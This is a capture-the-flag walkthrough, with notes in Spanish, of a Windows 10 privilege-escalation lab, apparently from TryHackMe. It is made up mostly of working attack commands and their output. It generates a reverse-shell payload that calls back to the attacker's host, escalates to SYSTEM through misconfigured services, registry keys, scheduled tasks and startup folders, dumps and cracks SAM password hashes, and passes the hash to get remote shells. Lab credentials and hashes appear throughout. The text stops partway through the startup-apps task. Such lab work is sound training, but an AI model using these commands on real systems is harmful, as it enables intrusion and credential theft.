
## Task 1 Deploy the Vulnerable Windows VM

```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.189.56
```


```
C:\Users\user>cd \PrivEsc

C:\PrivEsc>dir
 Volume in drive C has no label.
 Volume Serial Number is 54A8-AA62

 Directory of C:\PrivEsc

06/13/2020  02:08 PM    <DIR>          .
06/13/2020  02:08 PM    <DIR>          ..
02/22/2020  10:38 PM           222,592 accesschk.exe
06/05/2020  08:32 AM               959 AdminPaint.lnk
02/22/2020  10:38 PM               232 CreateShortcut.vbs
06/05/2020  08:32 AM               990 lpe.bat
02/22/2020  10:38 PM           678,312 plink.exe
02/22/2020  10:38 PM           494,860 PowerUp.ps1
06/05/2020  09:06 AM            27,136 PrintSpoofer.exe
02/22/2020  10:38 PM         1,258,824 Procmon64.exe
02/22/2020  10:38 PM           374,944 PsExec64.exe
05/11/2020  09:23 AM           159,232 RoguePotato.exe
06/05/2020  08:32 AM               221 savecred.bat
02/22/2020  10:38 PM           160,768 Seatbelt.exe
02/22/2020  10:38 PM            26,112 SharpUp.exe
03/06/2020  08:00 PM           229,376 winPEASany.exe
              14 File(s)      3,634,558 bytes
               2 Dir(s)  30,851,162,112 bytes free

C:\PrivEsc>whoami
win-qba94kb3iof\user

C:\PrivEsc>
```
## Task 2 Generate a Reverse Shell Executable
### Generate a reverse shell executable and transfer it to the Windows VM. Check that it works!
#### Generamos reverse
```
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.13.236 LPORT=53 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe

```

#### lo transfermimos a la victima
```
> kali
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .


[sudo] password for kali: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed

[*] AUTHENTICATE_MESSAGE (WIN-QBA94KB3IOF\user,WIN-QBA94KB3IOF)
[*] User WIN-QBA94KB3IOF\user authenticated successfully
[*] user::WIN-QBA94KB3IOF:aaaaaaaaaaaaaaaa:64b1345765c9a3eb3578761a19cc5898:01010000000000008092abe8fb20db01d6edfbf64b1400c900000000010010005300700063004500700059007600680003001000530070006300450070005900760068000200100061004e006700500066004f00410057000400100061004e006700500066004f0041005700070008008092abe8fb20db0106000400020000000800300030000000000000000000000000200000f503ac98dbf410e31249dcf17d8d421ecfee8c879750f3f36dcceb9f0a9d255d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e0036002e00310033002e00320033003600000000000000000000000000
[*] Disconnecting Share(1:IPC$)


> victima

C:\Users\user>copy \\10.6.13.236\kali\reverse.exe c:\PrivEsc
        1 file(s) copied.

C:\Users\user>

        1 file(s) copied.
        


```

#### lo ejecutamos

```
> kali

┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ nc -lnvp 53                                                              
listening on [any] 53 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.189.56] 49796
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\PrivEsc>


> victima

C:\PrivEsc>reverse.exe

C:\PrivEsc>




```


#### Corremos winipeas, para identificar los servicios vulnerables que usaremos mas abajo

```
> windows
C:\PrivEsc>winPEASany.exe quite services info > winipeas.txt

C:\PrivEsc>copy winipeas.txt \\10.6.13.236\kali
        1 file(s) copied.

C:\PrivEsc>



> kali

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
┌──(kali㉿kali)-[~/tryhackme/linuxserverforensics]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
[sudo] password for kali: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.157.160,49753)
[*] AUTHENTICATE_MESSAGE (WIN-QBA94KB3IOF\user,WIN-QBA94KB3IOF)
[*] User WIN-QBA94KB3IOF\user authenticated successfully
[*] user::WIN-QBA94KB3IOF:aaaaaaaaaaaaaaaa:3a454e5ecb67558346c9215e1266b1b5:01010000000000008038843e0421db01ab4877eeefe0c3630000000001001000770044005a0073007000500067007a0003001000770044005a0073007000500067007a0002001000540066004f0074006f0068006e00720004001000540066004f0074006f0068006e007200070008008038843e0421db010600040002000000080030003000000000000000000000000020000046980ae477f953bc72d81d7d0e51f70d0243f139ba4cbf497635d39488366db20a001000000000000000000000000000000000000900200063006900660073002f00310030002e0036002e00310033002e00320033003600000000000000000000000000
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:KALI)
[*] Closing down connection (10.10.157.160,49753)
[*] Remaining connections []

┌──(kali㉿kali)-[~/tryhackme/linuxserverforensics]
└─$ ls -la     
total 56
drwxrwxr-x  2 kali kali  4096 Oct 17 21:20 .
drwxrwxr-x 18 kali kali  4096 Oct 17 20:15 ..
-rwxr-xr-x  1 root root 46783 Dec 31  1969 winipeas.txt
                                                                                
┌──(kali㉿kali)-[~/tryhackme/linuxserverforensics]
└─$ 

```
## Task 3 Service Exploits - Insecure Service Permissions

#### Busamos en winipeas.txt

```
less winipeas.txt

/Modifiable Services

 [+] Modifiable Services(T1007)
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    daclsvc: WriteData/CreateFiles




```

### What is the original BINARY_PATH_NAME of the daclsvc service?

#### Checamos servicio (permite cambiar configuración y tiene privilegios de sistema)

```
C:\>C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        
        SERVICE_CHANGE_CONFIG
        
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

C:\>sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\Program Files\DACL Service\daclservice.exe
```

### lanzamos reverse shell

```
> victima


[sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
net start daclsvc](<C:\%3Esc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
[SC] ChangeServiceConfig SUCCESS>)

net start daclsvc


> kali



┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ nc -lnvp 53
listening on [any] 53 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.189.56] 49828
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>


```
## Task 4 Service Exploits - Unquoted Service Path

#### buscamos en winipeas.txt
```
less winipeas.txt

/No quotes
unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected

```

#### What is the BINARY_PATH_NAME of the unquotedsvc service?

#### revisamos servicio si comillas en la ruta
```
C:\>sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem


C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```

#### revisamos sus permisos, users puede escribir
```
C:\>C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  
  RW BUILTIN\Users
  
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

#### le copiamos el reverse
```
C:\>copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
        1 file(s) copied.

C:\>
```

#### reiniciamos sl servicio y tenemos la shell
```
> victima
C:\>net start unquotedsvc

> kali

┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ nc -lnvp 53
listening on [any] 53 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.189.56] 49843
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

## Task 5 Service Exploits - Weak Registry Permissions

#### buscamos en winipeas.txt
```
less -R winipeas.txt
/registry

 [+] Looking if you can modify any service registry()
   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
    HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])

```

### Read and follow along with the above.

#### revisamos servicio, corre como sistema privilegios
```
C:\>sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\>
```

#### revisamos el registro, y escribible por INTERACTIVE, es decir todos los usuario

```
C:\>C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS


```

#### Escribimos en el registro en ImagePath, que es la ruta del servicio en el registro

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```
#### Corremos para tener shell

```
> victima

C:\PrivEsc>net start regsvc

> kali

┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ nc -lnvp 53                                                              
listening on [any] 53 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.157.160] 49931
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```
## Task 6 Service Exploits - Insecure Service Executables

#### Buscamos en winipeas.tx

```
less -R winipeas.txt

/File Permissions

filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service
\filepermservice.exe"] - Manual - Stopped
    File Permissions: Everyone [AllAccess]

```
#### verificamos el servicio y corre como derechos de system

```
C:\PrivEsc>sc qc filepermsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

- verificamos los accesos, es escribible por toodos
```
C:\Users\user>C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS

C:\Users\user>
```

- Copiamos el ejecutable del reverse shell y replacamos el filepermservice.exe con el
```
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

- iniciamos el servicio y el shell se lanza
```
> victima windows
C:\Users\user>net start filepermsvc


> kali
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ nc -lnvp 53           
listening on [any] 53 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.159.215] 49764
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```
## Task 7 Registry - AutoRuns

- consultamos el registro para ver que programas arrancan al inicio con el sistema
```
C:\Users\user>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"


C:\Users\user>
```

- Revisar los accesos, tenemos que es escribible por todos
```
 C:\Users\user>C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS

C:\Users\user>
```

- copia el reverse
```
C:\Users\user>copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
        1 file(s) copied.

C:\Users\user>
```

- REINICIAMOS la vm y ponemos el listener y reconectmos de nuevo
```
> reconectamos victima
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.159.215


> kali
                                                                                            
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ nc -lnvp 53
listening on [any] 53 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.159.215] 49681
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>



```
## Task 8 Registry - AlwaysInstallElevated
- Verificamos el registro para AlwaysInstallElevated, ambos son 1
```
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\user>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\Users\user>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\Users\user>
```

- generamos un reverseshell y lo transferimos
```
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.13.236 LPORT=53 -f msi -o reverse.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: reverse.msi
                                                                                            
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ 


> windows victima
C:\Users\user>copy \\10.6.13.236\kali\reverse.msi c:\PrivEsc
        1 file(s) copied.

C:\Users\user>

```

- Ponemos a la escucha y lanzamos 
```
> windows
C:\Users\user>msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

C:\Users\user>



> kali
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ nc -lnvp 53
listening on [any] 53 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.159.215] 49766
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>


```
## Task 9 Passwords - Registry

- buscamos en el registro
```
> todo
reg query HKLM /f password /t REG_SZ /s

> poco
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

```

- Abrimos un shell con las credenciales 

```
> forma 1 pero no jala

┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ winexe -U 'user%password321' //10.10.19.205 cmd.exe 
                                                                                            
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ 
```

```
> forma 2

┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py admin:password123@10.10.19.205
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.19.205.....
[*] Found writable share ADMIN$
[*] Uploading file RircrneO.exe
[*] Opening SVCManager on 10.10.19.205.....
[*] Creating service OXAA on 10.10.19.205.....
[*] Starting service OXAA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

```

```
> forma 3

msf6 > use exploit/windows/smb/psexec
[*] Using configured payload windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > 

msf6 exploit(windows/smb/psexec) > set smbuser admin
smbuser => admin
msf6 exploit(windows/smb/psexec) > set smbpass password123
smbpass => password123
msf6 exploit(windows/smb/psexec) > set rhost 10.10.19.205
rhost => 10.10.19.205
msf6 exploit(windows/smb/psexec) > set lhost 10.6.13.236
lhost => 10.6.13.236
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.6.13.236:4444 
[*] 10.10.19.205:445 - Connecting to the server...
[*] 10.10.19.205:445 - Authenticating to 10.10.19.205:445 as user 'admin'...
[*] 10.10.19.205:445 - Selecting PowerShell target
[*] 10.10.19.205:445 - Executing the payload...
[+] 10.10.19.205:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 10.10.19.205
[*] Meterpreter session 1 opened (10.6.13.236:4444 -> 10.10.19.205:49817) at 2024-10-20 22:25:17 -0500

meterpreter > 

```


## Task 10 Passwords - Saved Creds

- Listrar credenciales grabadas
```
C:\Users\user>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02nfpgrklkitqatu
    Local machine persistence

    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin
```

- Corremos el reverse con las credenciales de admin
```
> windows
C:\Users\user>runas /savecred /user:admin C:\PrivEsc\reverse.exe
Attempting to start C:\PrivEsc\reverse.exe as user "WIN-QBA94KB3IOF\admin" ...

C:\Users\user>

> kali

┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ nc -lnvp 53                             
listening on [any] 53 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.169.52] 49765
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin

```

## Task 11 Passwords - Security Account Manager (SAM)



- copiamos los archivos de respaldo de sam y system
```
> usamos

C:\Users\user>copy c:\windows\repair\sam \\10.6.13.236\kali
        1 file(s) copied.

C:\Users\user>copy c:\windows\repair\system \\10.6.13.236\kali
        1 file(s) copied.

C:\Users\user>
```

- Usamos creddump7
```
> instalamos
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ sudo apt install creddump7
creddump7 is already the newest version (0.1+git20190429-1.1).
creddump7 set to manually installed.
The following package was automatically installed and is no longer required:
  libjim0.82t64
Use 'sudo apt autoremove' to remove it.

Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 0

> va

┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ /usr/share/creddump7/pwdump.py SYSTEM SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
                                                                                     
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ 


> crack

┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ hashcat -m 1000 --force hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: cpu--0x000, 1437/2938 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

a9fdfa038c4b75ebc76dc855dd74f0da:password123              
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: a9fdfa038c4b75ebc76dc855dd74f0da
Time.Started.....: Mon Oct 21 21:34:29 2024, (0 secs)
Time.Estimated...: Mon Oct 21 21:34:29 2024, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    51001 H/s (0.03ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1536/14344385 (0.01%)
Rejected.........: 0/1536 (0.00%)
Restore.Point....: 1024/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: kucing -> mexico1
Hardware.Mon.#1..: Util: 50%

Started: Mon Oct 21 21:34:15 2024
Stopped: Mon Oct 21 21:34:30 2024


```

```
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt --format=NT
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 ASIMD 4x2])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (admin)     
1g 0:00:00:00 DONE (2024-10-21 21:38) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
                   
```

### What is the NTLM hash of the admin user?
a9fdfa038c4b75ebc76dc855dd74f0da


## Task 12 Passwords - Passing the Hash

```
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.92.118 cmd.exe
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...

```

```
impacket-wmiexec -hashes :a9fdfa038c4b75ebc76dc855dd74f0da admin@10.10.92.118
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>

```

```
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ impacket-psexec -hashes :a9fdfa038c4b75ebc76dc855dd74f0da admin@10.10.92.118 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.92.118.....
[*] Found writable share ADMIN$
[*] Uploading file WKFYiKZz.exe
[*] Opening SVCManager on 10.10.92.118.....
[*] Creating service JncT on 10.10.92.118.....
[*] Starting service JncT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 

```

- remote desktop con el hash
```

```
## Task 13 Scheduled Tasks

- Vemos el script
```
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\user>type C:\DevTools\CleanUp.ps1
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log

C:\Users\user>
```
- Permisos
```
C:\Users\user>C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
RW C:\DevTools\CleanUp.ps1
        FILE_ADD_FILE
        FILE_ADD_SUBDIRECTORY
        FILE_APPEND_DATA
        FILE_EXECUTE
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_TRAVERSE
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        DELETE
        SYNCHRONIZE
        READ_CONTROL

C:\Users\user>
```
- le agregamos una linea para que ejecute el reverse
```
C:\Users\user>
C:\Users\user>echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

C:\Users\user>type c:\DevTools\CleanUp.ps1
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log
C:\PrivEsc\reverse.exe

C:\Users\user>

>> kali
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ nc -lnvp 53
listening on [any] 53 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.92.118] 49839
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>




```
## Task 14 Insecure GUI Apps

- ejecutamos el paint que esta sobre el escritorio
- verificamos que corre con permisos altos
```
tasklist /V | findstr mspaint.exe


```

- File / Open y en la barra de navegacion

```
file://c:/windows/system32/cmd.exe
```
- se abre ventana administrativa
```
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\admin\Pictures>whoami
win-qba94kb3iof\admin

C:\Users\admin\Pictures>
```
## Task 15 Startup Apps

- Verificamos que Users puede escribir ahi
```
C:\Users\user>C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW WIN-QBA94KB3IOF\Administrator
  RW WIN-QBA94KB3IOF\admin
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  R  Everyone
```

- Creamos un acceso directo al reverse
```
C:\Users\user>cscript C:\PrivEsc\CreateShortcut.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.


C:\Users\user>
C:\Users\user>type \PrivEsc\CreateShortcut.vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save

C:\Users\user>

C:\Users\user>dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 Volume in drive C has no label.
 Volume Serial Number is 54A8-AA62

 Directory of C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

10/22/2024  12:24 PM    <DIR>          .
10/22/2024  12:24 PM    <DIR>          ..
10/22/2024  12:24 PM               623 reverse.lnk
               1 File(s)            623 bytes
